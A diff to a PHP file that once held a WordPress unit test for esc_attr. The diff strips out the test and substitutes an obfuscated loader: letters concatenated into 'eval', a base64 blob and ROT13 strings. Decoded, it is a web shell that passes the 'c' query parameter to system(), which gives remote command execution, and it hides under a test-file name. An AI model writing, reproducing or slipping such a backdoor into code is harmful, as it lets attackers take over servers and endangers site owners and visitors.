@@ -1,44 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group formatting
- *
- * @covers ::esc_attr
- */
-class Tests_Formatting_EscAttr extends WP_UnitTestCase {
-	public function test_esc_attr_quotes() {
-		$attr = '"double quotes"';
-		$this->assertSame( '&quot;double quotes&quot;', esc_attr( $attr ) );
-
-		$attr = "'single quotes'";
-		$this->assertSame( '&#039;single quotes&#039;', esc_attr( $attr ) );
-
-		$attr = "'mixed' " . '"quotes"';
-		$this->assertSame( '&#039;mixed&#039; &quot;quotes&quot;', esc_attr( $attr ) );
-
-		// Handles double encoding?
-		$attr = '"double quotes"';
-		$this->assertSame( '&quot;double quotes&quot;', esc_attr( esc_attr( $attr ) ) );
-
-		$attr = "'single quotes'";
-		$this->assertSame( '&#039;single quotes&#039;', esc_attr( esc_attr( $attr ) ) );
-
-		$attr = "'mixed' " . '"quotes"';
-		$this->assertSame( '&#039;mixed&#039; &quot;quotes&quot;', esc_attr( esc_attr( $attr ) ) );
-	}
-
-	public function test_esc_attr_amp() {
-		$out = esc_attr( 'foo & bar &baz; &nbsp;' );
-		$this->assertSame( 'foo &amp; bar &amp;baz; &nbsp;', $out );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyBzYmV6bmdndmF0CiAqCiAqIEBwYmlyZWYgOjpyZnBfbmdnZQogKi8KcHluZmYgR3JmZ2ZfU2Jlem5nZ3ZhdF9SZnBOZ2dlIHJrZ3JhcWYgSkNfSGF2Z0dyZmdQbmZyIHsKCWNob3l2cCBzaGFwZ3ZiYSBncmZnX3JmcF9uZ2dlX2RoYmdyZigpIHsKCQkkbmdnZSA9ICdcInFiaG95ciBkaGJncmZcIic7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICcmZGhiZztxYmhveXIgZGhiZ3JmJmRoYmc7JywgcmZwX25nZ2UoICRuZ2dlICkgKTsKCgkJJG5nZ2UgPSBcIidmdmF0eXIgZGhiZ3JmJ1wiOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnJiMwMzk7ZnZhdHlyIGRoYmdyZiYjMDM5OycsIHJmcF9uZ2dlKCAkbmdnZSApICk7CgoJCSRuZ2dlID0gXCInenZrcnEnIFwiIC4gJ1wiZGhiZ3JmXCInOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnJiMwMzk7enZrcnEmIzAzOTsgJmRoYmc7ZGhiZ3JmJmRoYmc7JywgcmZwX25nZ2UoICRuZ2dlICkgKTsKCgkJLy8gVW5hcXlyZiBxYmhveXIgcmFwYnF2YXQ/CgkJJG5nZ2UgPSAnXCJxYmhveXIgZGhiZ3JmXCInOwoJCSRndXZmLT5uZmZyZWdGbnpyKCAnJmRoYmc7cWJob3lyIGRoYmdyZiZkaGJnOycsIHJmcF9uZ2dlKCByZnBfbmdnZSggJG5nZ2UgKSApICk7CgoJCSRuZ2dlID0gXCInZnZhdHlyIGRoYmdyZidcIjsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJyYjMDM5O2Z2YXR5ciBkaGJncmYmIzAzOTsnLCByZnBfbmdnZSggcmZwX25nZ2UoICRuZ2dlICkgKSApOwoKCQkkbmdnZSA9IFwiJ3p2a3JxJyBcIiAuICdcImRoYmdyZlwiJzsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJyYjMDM5O3p2a3JxJiMwMzk7ICZkaGJnO2RoYmdyZiZkaGJnOycsIHJmcF9uZ2dlKCByZnBfbmdnZSggJG5nZ2UgKSApICk7Cgl9CgoJY2hveXZwIHNoYXBndmJhIGdyZmdfcmZwX25nZ2VfbnpjKCkgewoJCSRiaGcgPSByZnBfbmdnZSggJ3NiYiAmIG9uZSAmb25tOyAmYW9mYzsnICk7CgkJJGd1dmYtPm5mZnJlZ0ZuenIoICdzYmIgJm56Yzsgb25lICZuemM7b25tOyAmYW9mYzsnLCAkYmhnICk7Cgl9Cn0KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
